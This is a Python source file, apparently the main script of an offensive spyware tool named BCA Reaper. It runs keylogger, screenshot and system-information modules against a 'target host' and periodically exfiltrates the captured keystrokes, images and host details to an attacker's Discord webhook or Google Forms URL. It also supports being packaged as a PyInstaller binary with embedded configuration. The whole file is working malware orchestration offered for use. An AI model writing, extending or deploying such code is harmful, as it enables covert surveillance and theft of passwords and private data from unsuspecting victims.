#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Reaper

__author__ = "EONRaider @ keybase.io/eonraider"

import argparse
import os
import platform
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from uuid import uuid4

from src.modules import (
    Discord,
    GoogleForms,
    KeyLogger,
    ScreenShot,
    SystemInformation
)


class Reaper:
    def __init__(self, *,
                 exfil_time: float,
                 discord_webhook: str = None,
                 google_forms_url: str = None):
        """Set up Reaper with exploitation and exfiltration modules.

        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to
            None to perform a single operation.
        :param discord_webhook: URL of a Webhook for the Discord server.
        :param google_forms_url: URL of a remote instance of Google
            Forms.
        """
        self.exfil_time = exfil_time
        self._exfiltration = list()
        self.webhook = discord_webhook
        self.forms_url = google_forms_url

    @property
    def webhook(self) -> [str, None]:
        return self._webhook

    @webhook.setter
    def webhook(self, url: [str, None]):
        if url is not None:
            discord = partial(Discord, webhook_url=url)
            self._exfiltration.append(discord)
        self._webhook = url

    @property
    def forms_url(self):
        return self._forms_url

    @forms_url.setter
    def forms_url(self, url: [str, None]):
        if url is not None:
            google_forms = partial(GoogleForms, form_url=url)
            self._exfiltration.append(google_forms)
        self._forms_url = url

    @property
    def screenshot_path(self) -> str:
        """Gets a platform-dependent absolute path for the screenshot
        file."""

        '''Set a random name for the screenshot file. The '.jpeg' 
        extension is only required as a convenience for the generation 
        of an image preview by the Discord server. It can be safely 
        suppressed.'''
        filename = f"{str(uuid4())}.jpeg"
        if platform.system() == "Windows":
            app_data = os.path.expandvars(r"%LOCALAPPDATA%")
            path = os.path.join(app_data, "Temp", filename)
        else:  # Linux/Unix
            path = f"/tmp/{filename}"
        return path

    @property
    def exploitation(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
        """Gets a set of initialized ExploitationModule instances."""
        return {
            KeyLogger(exfil_time=self.exfil_time),
            ScreenShot(exfil_time=self.exfil_time,
                       image_path=self.screenshot_path),
            SystemInformation()
        }

    def execute(self) -> None:
        with ThreadPoolExecutor() as executor:
            for exploit in self.exploitation:
                for exfil in self._exfiltration:
                    exfil(module=exploit)
                executor.submit(exploit.execute)


def parse_cli() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="BCA Reaper - Log keystrokes, take screenshots and grab "
                    "system information from a target host and exfiltrate to "
                    "Discord and Google Forms"
    )
    parser.add_argument(
        "-w", "--webhook",
        type=str,
        metavar="<webhook_url>",
        help="URL of a Webhook for the Discord server."
    )
    parser.add_argument(
        "-f", "--forms",
        type=str,
        metavar="<google_forms_url>",
        help="URL of a remote instance of Google Forms."
    )
    parser.add_argument(
        "-e", "--exfil-time",
        type=float,
        metavar="<seconds>",
        default=30,
        help="Time in seconds to wait between periodic executions of the "
             "exfiltration of logged data. Defaults to 30 seconds. Set to None "
             "to perform a single operation."
    )

    return parser


if __name__ == "__main__":
    _args = parse_cli().parse_args()

    try:
        '''Reaper is executed as a binary compiled by PyInstaller. All 
        configuration options are read from the 'config.py' file that 
        is created and bundled in the binary during the build process 
        defined by 'build.py'.'''
        import importlib
        import sys
        pyinstaller_path = sys._MEIPASS
        args = importlib.import_module("config")
        if not (args.webhook or args.forms):
            raise AttributeError
    except (ModuleNotFoundError, AttributeError):
        '''Reaper is executed with configuration options parsed from 
        the CLI.'''
        args = _args

    Reaper(
        exfil_time=args.exfil_time,
        discord_webhook=args.webhook,
        google_forms_url=args.forms
    ).execute()
